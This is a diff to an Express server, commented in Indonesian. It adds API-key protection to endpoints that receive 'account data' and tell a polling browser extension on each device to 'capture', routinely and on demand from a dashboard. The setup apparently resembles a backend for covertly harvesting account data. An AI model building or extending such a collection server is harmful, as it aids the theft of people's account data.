@@ -7,6 +7,38 @@ require('dotenv').config();
 const app = express();
 const PORT = process.env.PORT || 3000;
 
+// ========== API KEY CONFIG ==========
+// Simpan API key di .env sebagai: API_KEY=sk_live_xxxxxxxxxxxx
+const VALID_API_KEY = process.env.API_KEY;
+
+if (!VALID_API_KEY) {
+    console.error('❌ FATAL: API_KEY tidak ditemukan di .env! Server tidak akan berjalan.');
+    process.exit(1);
+}
+
+// ========== MIDDLEWARE API KEY ==========
+// Semua endpoint /api/* KECUALI /api/dashboard tidak butuh auth
+function requireApiKey(req, res, next) {
+    const apiKey = req.headers['x-api-key'];
+
+    if (!apiKey) {
+        return res.status(401).json({ 
+            success: false, 
+            error: 'API key diperlukan. Sertakan header: x-api-key' 
+        });
+    }
+
+    if (apiKey !== VALID_API_KEY) {
+        console.warn(`⚠️ API key salah dari IP: ${req.ip} | Key: ${apiKey.substring(0, 10)}...`);
+        return res.status(403).json({ 
+            success: false, 
+            error: 'API key tidak valid' 
+        });
+    }
+
+    next(); // Key benar, lanjut
+}
+
 app.use(cors());
 app.use(express.json({ limit: '100mb' }));
 app.use(express.static('public'));
@@ -24,7 +56,7 @@ if (!fs.existsSync(DATA_FILE)) {
 }
 
 // ========== POLLING MECHANISM ==========
-const pollRequests = new Map(); // Track which devices need to capture
+const pollRequests = new Map();
 
 function readData() {
     try {
@@ -45,6 +77,10 @@ function readData() {
 function writeData(data) {
     fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
 }
+
+// ========== SEMUA ROUTE /api/* DILINDUNGI API KEY ==========
+// Terapkan middleware ke semua /api/*
+app.use('/api', requireApiKey);
 
 // ========== RECEIVE ACCOUNT DATA ==========
 app.post('/api/account', async (req, res) => {
@@ -136,7 +172,7 @@ app.post('/api/account', async (req, res) => {
     }
 });
 
-// ========== POLLING ENDPOINT - Extension check ini setiap 6 detik ==========
+// ========== POLLING ENDPOINT ==========
 app.post('/api/poll', (req, res) => {
     try {
         const { deviceId } = req.body;
@@ -148,7 +184,6 @@ app.post('/api/poll', (req, res) => {
             });
         }
 
-        // Check apakah ada capture request untuk device ini
         const hasRequest = pollRequests.has(deviceId);
         
         if (hasRequest) {
@@ -160,7 +195,6 @@ app.post('/api/poll', (req, res) => {
             });
         }
 
-        // Jika tidak ada request, tetap suruh capture (safety net)
         console.log(`📤 Poll: Routine capture for device ${deviceId}`);
         res.json({ 
             action: 'capture',
@@ -173,7 +207,7 @@ app.post('/api/poll', (req, res) => {
     }
 });
 
-// ========== FORCE CAPTURE ENDPOINT - bisa dipanggil dari dashboard ==========
+// ========== FORCE CAPTURE ENDPOINT ==========
 app.post('/api/force-capture', (req, res) => {
     try {
         const { deviceId } = req.body;
@@ -182,7 +216,6 @@ app.post('/api/force-capture', (req, res) => {
             return res.status(400).json({ success: false, error: 'deviceId required' });
         }
 
-        // Set flag untuk device ini harus capture
         pollRequests.set(deviceId, { 
             timestamp: new Date().toISOString(),
             reason: 'Manual force'
@@ -259,7 +292,7 @@ app.get('/api/stats', (req, res) => {
     }
 });
 
-// ========== DASHBOARD ==========
+// ========== DASHBOARD (tidak perlu API key — ini buat kamu buka di browser) ==========
 app.get('/dashboard', (req, res) => {
     const htmlPath = path.join(__dirname, 'public', 'dashboard.html');
     if (fs.existsSync(htmlPath)) res.sendFile(htmlPath);
@@ -268,8 +301,7 @@ app.get('/dashboard', (req, res) => {
 
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Server running on port ${PORT}`);
+    console.log(`🔑 API Key protection: AKTIF`);
     console.log(`📁 Data file: ${DATA_FILE}`);
-    console.log(`📡 Polling endpoints:`);
-    console.log(`   POST /api/poll - Extension checks this every 6 seconds`);
-    console.log(`   POST /api/force-capture - Manual force capture`);
+    console.log(`📡 Semua /api/* butuh header: x-api-key`);
 });
